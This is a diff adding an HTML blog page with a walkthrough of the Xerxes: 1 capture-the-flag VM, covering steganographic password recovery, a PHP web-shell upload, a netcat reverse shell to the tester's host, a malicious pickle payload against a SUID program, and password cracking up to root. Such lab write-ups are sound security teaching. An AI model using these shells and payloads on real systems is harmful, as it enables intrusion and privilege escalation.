@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>Xerxes: 1 - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2014-05-16">May 16, 2014</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/xerxes">xerxes</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">Xerxes: 1</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>Xerxes is a great VM challenge, created by <a href="http://barrebas.github.io">barrebas</a>.  It&rsquo;s quite a devilish challenge, I found - especially getting the inital foothold.  The goal is to obtain root and access the flag.</p>
+
+<h2 id="nmap:e030175fb591c9e48fb1260bc12c80d4">Nmap</h2>
+
+<pre><code class="language-text">root@kali:~# nmap -n -sV -A -p- 192.168.127.128
+
+22/tcp open  ssh     OpenSSH 6.0p1 Debian 4 (protocol 2.0)
+| ssh-hostkey:
+|   1024 78:63:e9:43:33:d3:80:0e:b2:83:15:26:fc:41:ea:17 (DSA)
+|   2048 48:69:ae:38:d5:a1:05:e2:f5:22:45:49:35:b0:ca:5c (RSA)
+|_  256 14:3c:81:fb:32:dd:70:70:05:63:1a:d2:8e:ef:32:64 (ECDSA)
+80/tcp open  http    Apache httpd 2.2.22 ((Debian))
+| http-robots.txt: 2 disallowed entries
+|_/ /dev
+|_http-title: Site doesn't have a title (text/html).
+</code></pre>
+
+<p>Nmap picks out the contents of the robots.txt file, <code>/dev/</code>.  Before I got too ahead of myself, I ran <code>nikto</code>, <code>wfuzz</code> and <code>dirbuster</code>, but nothing else popped.</p>
+
+<h2 id="dev:e030175fb591c9e48fb1260bc12c80d4">/dev/</h2>
+
+<p>This page has a password-protected upload function.</p>
+
+<p>First, I tried uploading a simple PHP CMD file without a password, but received the following error: <em>&ldquo;Error: illegal file detected.&rdquo;</em></p>
+
+<p>Then, I ran <code>echo test &gt; test</code>, tried uploading that without a password, and received the error: <em>&ldquo;Error: you have supplied an invalid password.&rdquo;</em></p>
+
+<p>That obviously gave me two pieces of information, but I couldn&rsquo;t progress without a valid password.  I tried to bruteforce it with a simple wordlist, but didn&rsquo;t have any luck.  The POST data is submitted to the web server with <code>multipart/form-data</code> encoding, which is a little different to the <code>x-www-form-urlencoded</code> format that I&rsquo;m more familiar with.</p>
+
+<p>On the forgotten password page is a QR Code image (but no actual functionality for resetting a password).  I uploaded this image to a decoder website, which returned a base64 encoded string.</p>
+
+<p><code>bG9vayBkZWVwZXI=</code></p>
+
+<p>I then decoded this, which returned the message:</p>
+
+<p><code>look deeper</code></p>
+
+<p>I hate cryptic messages :)</p>
+
+<h2 id="looking-deeper:e030175fb591c9e48fb1260bc12c80d4">Looking Deeper</h2>
+
+<p>So I took the clue to &lsquo;look deeper&rsquo;, and had a closer look at the QR image.  I opened it up in The GIMP and pretty quickly something jumped out.  There is a row of transparent pixels at the top-left of the image.  You can&rsquo;t see them on the web page, as the white background of the page shows through the pixels, but in an editor, you can see the checkboard canvas.</p>
+
+<p>I did some manipulation on these pixels (brightness/contrast, levels &amp; curves etc) but nothing else was revealed.  I had a look at the pixel values and they are all pure white (RGB 255, 255, 255), but they each have a different level of transparency (Alpha value).</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/xerxes-1/colour-picker.png"  />
+    
+    
+</figure>
+</div>
+
+<p>I collected these values for each of the transparent pixels until I had a full list.</p>
+
+<p><code>75 121 115 114 75 121 115 114 87 122 52 114 75 121 115 114 75 121 115 114 75 122 119 116 88 84 52 114 75 121 115 114 76 105 115 117 76 83 48 116 76 83 52 116 76 105 52 61</code></p>
+
+<p>I then tried applying various encoders/decoders to them.  Eventually, I found that encoding these values in Hex:</p>
+
+<p><code>4b 79 73 72 4b 79 73 72 57 7a 34 72 4b 79 73 72 4b 79 73 72 4b 7a 77 74 58 54 34 72 4b 79 73 72 4c 69 73 75 4c 53 30 74 4c 53 34 74 4c 69 34 3d</code></p>
+
+<p>Then decoding them into ASCII:</p>
+
+<p><code>K y s r K y s r W z 4 r K y s r K y s r K z w t X T 4 r K y s r L i s u L S 0 t L S 4 t L i 4 =</code></p>
+
+<p>Gave me another base64 string.  I removed the white spaces, and decoded that into the following:</p>
+
+<p><code>++++++[&gt;++++++++&lt;-]&gt;++++.+.----.-..</code></p>
+
+<p>I was really disappointed to see this, as I thought I was well off base.  This doesn&rsquo;t look like anything I&rsquo;ve seen before, although I figured it would be a massive coincidence that the steps taken thus far gave me valid base64 string.  So I thought this must be significant somehow.</p>
+
+<p>Googling that string didn&rsquo;t come up with anything.  I went and found an online compiler of multiple programming languages - I admit that I&rsquo;ve never seen this type of code before, but doesn&rsquo;t mean it doesn&rsquo;t exist.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/xerxes-1/compileonline.png"  />
+    
+    
+</figure>
+</div>
+
+<p>Clicking through each of these languages takes you to a page, containing a small script sample.  That made it a really quick exercise to get a very quick overview of each language.  I kept going until I found one with the syntax matching my string.</p>
+
+<p>The brainf**k language matched perfectly and when I pasted my snippet into the window, it produced a value of <code>45100</code>.</p>
+
+<p>I went back to the upload page and uploaded my test file again with <code>45100</code> as the password, and received:  <em>&ldquo;test was uploaded. Have a nice day.&rdquo;</em>  Following the link showed that the files are uploaded to the <code>/dev/upload/</code> directory.</p>
+
+<h2 id="web-shell:e030175fb591c9e48fb1260bc12c80d4">Web Shell</h2>
+
+<p>Even though I expected it to fail as before, I tried to upload my PHP CMD file - it failed with the same error message.  I did some searching to find valid MimeTypes for Apache on Debian, and found what I was looking for fairly quickly on debian.org.</p>
+
+<p><code>application/x-httpd-php                         phtml pht php</code></p>
+
+<p>This means that any file with an one of those three extensions, will be handled by the web server as PHP.  PHTML was also blocked, but PHT was sucessfully uploaded:  <em>&ldquo;cmd.pht was uploaded. Have a nice day.&rdquo;</em></p>
+
+<pre><code class="language-text">root@kali:~/xerxes# curl http://192.168.127.131/dev/upload/cmd.pht?cmd=id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+
+<p>I used this command execution to obtain a netcat shell on the system.</p>
+
+<pre><code class="language-text">cmd=/bin/nc.traditional 192.168.127.127 4444 -e '/bin/sh'
+python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+
+<p>Using this level of access, I was able to access <code>/home/amanpour</code>.  There were several interesting files in here:</p>
+
+<pre><code class="language-text">www-data@xerxes:/home/amanpour$ ls -la
+
+drwxr-xr-x 3 amanpour amanpour 4096 Dec 19 01:15 .
+drwxr-xr-x 5 root     root     4096 Dec 17 23:34 ..
+-rwxr--r-- 1 amanpour amanpour  270 Dec 19 01:28 .bash_history
+-rw-r--r-- 1 amanpour amanpour  220 Dec 17 23:31 .bash_logout
+-rw-r--r-- 1 amanpour amanpour 3433 Dec 19 01:27 .bashrc
+-rw-r--r-- 1 amanpour amanpour  675 Dec 17 23:31 .profile
+drwx------ 2 amanpour amanpour 4096 Dec 19 01:15 .ssh
+-rw-r--r-- 1 amanpour amanpour 1240 Dec 18 02:53 lostpassword.png
+-rw-r--r-- 1 amanpour amanpour 1220 Dec 18 02:57 newpassword
+-rw-r--r-- 1 amanpour amanpour 1071 Dec 17 07:05 qr
+-rw-r--r-- 1 amanpour amanpour 1235 Dec 18 02:51 steqr.py
+</code></pre>
+
+<p>If we view the <code>.bash_history</code> file for this user, it seems they used the <code>steqr</code> python script in conjunction with the <code>newpassword</code> file, to generate a new password.</p>
+
+<pre><code class="language-text">www-data@xerxes:/home/amanpour$ cat .bash_history
+cat .bash_history
+python steqr.py -f newpassword
+passwd
+exit
+</code></pre>
+
+<p>Repeating that command gives the following output:</p>
+
+<pre><code class="language-text">www-data@xerxes:/home/amanpour$ python steqr.py -f newpassword
+b56d9d8b6077fb56127d1c8ff84ece11
+</code></pre>
+
+<p>I tried using this password to SSH as amanpour and I was granted access :) At last a proper shell!</p>
+
+<p>A proper review of the <code>/etc/passwd</code> and <code>/etc/group</code> files showed that users amampour and curtiz were members of a notes group, and delacroix was a member of the sudo group.  This gave a good indication of the path I should be taking to obtain root.  Another interesting thing which I almost missed, was shell entries for each user.  amanpour and curtiz have <code>/bin/bash</code>, whereas delacroix has <code>/bin/delacroix</code>.  No doubt this will come into play later :).</p>
+
+<h2 id="suid:e030175fb591c9e48fb1260bc12c80d4">SUID</h2>
+
+<p>I had a look for SUID binaries and found one in <code>/opt/notes/</code>.</p>
+
+<pre><code class="language-text">find / -perm -4000 -type f 2&gt;/dev/null
+/opt/notes
+
+amanpour@xerxes:~$ cd /opt/
+amanpour@xerxes:/opt$ ls -l
+
+-rwsr-s--x 1 curtiz notes 5111 Dec 18 05:59 notes
+-rwxr-x--- 1 curtiz notes 1343 Dec 19 00:47 notes.py
+</code></pre>
+
+<p><code>notes.py</code> file is readable, so we can learn a few things.</p>
+
+<ul>
+<li>The pickle module is imported</li>
+<li>The default filename is <code>notes</code></li>
+<li>Files are saved in <code>/home/curtiz</code></li>
+</ul>
+
+<p>You can load the application and view the notes already entered.</p>
+
+<pre><code class="language-text">amanpour@xerxes:/opt$ ./notes
+-------------------------------
+ Welcome to Juan's to-do list! 
+   type help for more info     
+-------------------------------
+help 
+ Available commands:
+   - add  [note] : add a note for Juan
+   - show        : show to-do list
+   - save [file] : save to-do list
+   - load [file] : load to-do list
+   - quit        : exit
+load notes
+show
+ - I've found Marie's keyfile and was able to login via ssh,
+ - but it seems she has added another layer of protection...
+</code></pre>
+
+<p>Probably a clue for obtaining the delacroix user - take note.</p>
+
+<p>I went and did some reading around the python pickle module, and the actual python documentation contained an interesting warning message:</p>
+
+<blockquote>
+<p>Warning: The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.</p>
+</blockquote>
+
+<p>I carried on reading and came across a document called Sour Pickles, from an old Black Hat presentation which outlined the following PoC:</p>
+
+<pre><code class="language-text">cos
+system
+(S'sleep 10'
+tR.
+</code></pre>
+
+<p>I modified this so it would open a new shell.</p>
+
+<pre><code class="language-text">cos
+system
+(S'/bin/sh'
+tR.
+</code></pre>
+
+<p>I put this code into <code>/tmp/pickleme</code> and executed <code>notes</code>.</p>
+
+<pre><code class="language-text">amanpour@xerxes:/opt$ ./notes
+load ../../tmp/pickleme
+$ id
+uid=1001(amanpour) gid=1001(amanpour) euid=1002(curtiz) egid=1003(notes) groups=1002(curtiz),1001(amanpour),1003(notes)
+</code></pre>
+
+<h2 id="curtiz-delacroix:e030175fb591c9e48fb1260bc12c80d4">Curtiz &amp; Delacroix</h2>
+
+<p>I now have access to <code>/home/curtiz</code>.  The only interesting file in there is <code>id_rsa</code>.  Reading the <code>.bash_history</code> file, it seems to indicate that this key is for the delacroix user, but curtiz was unable to log in properly and wrote the note we saw earlier.</p>
+
+<pre><code class="language-text">root@kali:~/xerxes# ssh -i id_rsa delacroix@192.168.127.131
+Linux xerxes 3.2.0-4-486 #1 Debian 3.2.51-1 i686
+You have mail.
+Last login: Thu May  8 05:46:02 2014 from 192.168.127.127
+Password:
+</code></pre>
+
+<p>It seems the SSH portion of the login was successful, as it tells us there&rsquo;s mail waiting, but we also got prompted for another password.  This must be realted to the <code>/bin/delacroix</code> shell that we noticed in the <code>/etc/passwd</code> file earlier.  It&rsquo;s a binary executable, but has readable portions when viewed with <code>strings</code>.  Luckily, the password the program prompts for is shown.</p>
+
+<pre><code class="language-text">$ strings /bin/delacroix
+3d054afb77714ca938d8bca104fcb141
+/bin/bash
+Password:
+</code></pre>
+
+<p>So it seems the purpose of this program is to prompt for a password and launch <code>/bin/bash</code> when the correct one is entered.  I SSH&rsquo;d in again and tried this password, but it didn&rsquo;t work.  The next assumption was that this was an encrypted or encoded hash of a password.  I used hash-identifier which told me it was an MD5 hash.  Before I launched <code>john</code>, I tried my luck with an MD5 online cracker, which worked nicely.</p>
+
+<p><code>3d054afb77714ca938d8bca104fcb141 MD5 : VonBraun</code></p>
+
+<p>I was finally able to SSH in as delacroix.</p>
+
+<pre><code class="language-text">root@kali:~/xerxes# ssh -i id_rsa delacroix@192.168.127.131
+Linux xerxes 3.2.0-4-486 #1 Debian 3.2.51-1 i686
+You have mail.
+Last login: Fri May 16 13:57:11 2014 from 192.168.127.127
+Password: VonBraun
+XERXES checking security...
+delacroix@xerxes:/home/delacroix$
+</code></pre>
+
+<h2 id="root:e030175fb591c9e48fb1260bc12c80d4">root</h2>
+
+<p>I knew delacroix was a member of the sudo group, so tried to view her rights with <code>sudo -l</code>.  However, VonBraun was not her user password; *sigh*&hellip; Damn you Bas.</p>
+
+<p>There were two interesting files in her user directory: <code>check.sh</code> and <code>generate.sh</code>.  Viewing the <code>.bash_history</code> file suggested that her user password was generated by <code>generate.sh</code>.  Viewing this file showed that it was quite a simple script.</p>
+
+<pre><code class="language-bash">#!/bin/sh
+touch .last &amp;&amp; p=$(date | awk '{print $4}' | md5sum | awk '{print $1}')
+echo &quot;XERXES has generated a new password: $p&quot;
+echo &quot;  XERXES is forever&quot;
+echo &quot;   at your service&quot;
+</code></pre>
+
+<p>So a file is created called <code>.last</code> and the password generated is another MD5 of some portion of the date.  It doesn&rsquo;t seem <code>.last</code> is removed afterwards, so we can go back and redo these steps to obtain the same output.  I&rsquo;ve put the commands below in stages to make it easier to follow (there&rsquo;s probably a quicker way to do it, this is just how I worked through it).</p>
+
+<pre><code class="language-text">delacroix@xerxes:/home/delacroix$ stat .last                  
+  File: `.last'
+  Size: 0           Blocks: 0          IO Block: 4096   regular empty file
+Device: 801h/2049d  Inode: 45529       Links: 1
+Access: (0644/-rw-r--r--)  Uid: ( 1000/delacroix)   Gid: ( 1000/delacroix)
+Access: 2014-05-08 05:48:48.586907479 -0700
+Modify: 2013-12-19 00:19:51.024911360 -0800
+Change: 2013-12-19 00:19:51.024911360 -0800
+</code></pre>
+
+<p>You can take either the Modify or Change date (as they&rsquo;re the same).  It&rsquo;s important not to date the Access date, which will obviously not give us the result we want.  Doing <code>date | awk '{print $4}'</code> confirms the field we&rsquo;re after is the time, in this case it&rsquo;s <code>00:19:51</code>, but we&rsquo;ll stick with using awk to ensure there are no mistakes.</p>
+
+<pre><code class="language-text">delacroix@xerxes:/home/delacroix$ stat .last | grep Modify
+Modify: 2013-12-19 00:19:51.024911360 -0800
+</code></pre>
+
+<pre><code class="language-text">delacroix@xerxes:/home/delacroix$ stat .last | grep Modify | awk '{print $3}'
+00:19:51.024911360
+</code></pre>
+
+<pre><code class="language-text">delacroix@xerxes:/home/delacroix$ stat .last | grep Modify | awk '{print $3}' | cut -d&quot;.&quot; -f1
+00:19:51
+</code></pre>
+
+<pre><code class="language-text">delacroix@xerxes:/home/delacroix$ stat .last | grep Modify | awk '{print $3}' | cut -d&quot;.&quot; -f1 | md5sum
+6cf49e97c915079e27c09d41da9d95e4  -
+</code></pre>
+
+<p>So this gives us (what is hopefully) delacroix&rsquo;s current password.</p>
+
+<pre><code class="language-text">delacroix@xerxes:/home/delacroix$ sudo -l
+[sudo] password for delacroix: 6cf49e97c915079e27c09d41da9d95e4
+User delacroix may run the following commands on this host:
+    (ALL : ALL) ALL
+</code></pre>
+
+<p>Elevating to root was now a simple exercise: <code>sudo -i</code>
+Now to read the flag&hellip;</p>
+
+<pre><code class="language-text">root@xerxes:~# less /root/flag 
+&quot;/root/flag&quot; may be a binary file.  See it anyway?
+</code></pre>
+
+<p>You&rsquo;ve got to be joking, I thought&hellip;</p>
+
+<pre><code class="language-text">root@xerxes:~# file flag 
+flag: PNG image data, 250 x 269, 8-bit/color RGB, non-interlaced
+</code></pre>
+
+<p>Ah, that&rsquo;s not too bad :) Downloaded this to my machine, and&hellip;</p>
+
+<p><div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/xerxes-1/flag.jpg"  />
+    
+    
+</figure>
+</div></p>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2014  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
